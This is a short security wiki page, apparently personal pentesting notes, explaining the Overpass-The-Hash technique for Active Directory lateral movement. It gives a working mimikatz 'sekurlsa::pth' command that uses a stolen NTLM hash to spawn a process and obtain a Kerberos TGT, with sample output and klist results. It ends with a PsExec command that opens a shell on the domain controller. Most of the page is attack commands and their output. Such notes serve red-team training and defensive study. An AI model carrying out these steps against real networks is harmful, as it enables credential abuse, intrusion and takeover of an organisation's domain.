---
title: Overpass-The-Hash
date: M02-18-2023
author: i4
---
Much like [Pass-The-Hash](/wiki/Security/Windows/AD/Lateral%20Movement/Pass-The-Hash.md), [Overpass-The-Hash](/wiki/Security/Windows/AD/Lateral%20Movement/Overpass-The-Hash.md) uses the same functionality but uses the [NTLM](/wiki/Security/Windows/AD/Authentication/NTLM.md) (NTHash) credentials to request a [Kerberos](/wiki/Security/Windows/AD/Authentication/Kerberos.md) TGT.

- See [Mimikatz](/wiki/Security/Windows/Hashes/Mimikatz.md) to dump NTLM from memory.
- Overpassing-The-Hash with an NTLM NTHash only works if RC4 is enabled.
  If it isn't, you need to calculate the AES128 or AES256 hash either by using Rubeus or other means.

### Creating a ticket with mimikatz
- Spawns a new process in the context of the user
- This happens as Logon Type 9 which means that there is no new TGT yet  
```powershell
mimikatz # sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[hash] /run:PowerShell.exe

user    : [user]
domain  : [domain]
program : Powershell.exe
impers. : no
NTLM    : [ntlm]
  |  PID  5848
  |  TID  5124
  |  LSA Process is now R/W
  |  LUID 0 ; 3760912 (00000000:00396310)
  \_ msv1_0   - data copy @ 042999B4 : OK !
  \_ kerberos - data copy @ 04299098
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace -> null

PS C:\Windows\system32> klist

Current LogonId is 0:0x396310

Cached Tickets: (0)
PS C:\Windows\system32> dir //[DC]/sysvol 
...
PS C:\Windows\system32> klist
...
#1>     Client: [user] @ [domain]
        Server: krbtgt/[domain] @ [domain]
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/18/2023 5:26:50 (local)
        End Time:   2/18/2023 15:26:50 (local)
        Renew Time: 2/25/2023 5:26:50 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: [dc]
```

Since there is now a TGT for the user in memory, we can use tools that make use of kerberos:
```powersehll
PS C:\Windows\system32> PsExec.exe \\[DC] cmd.exe
```
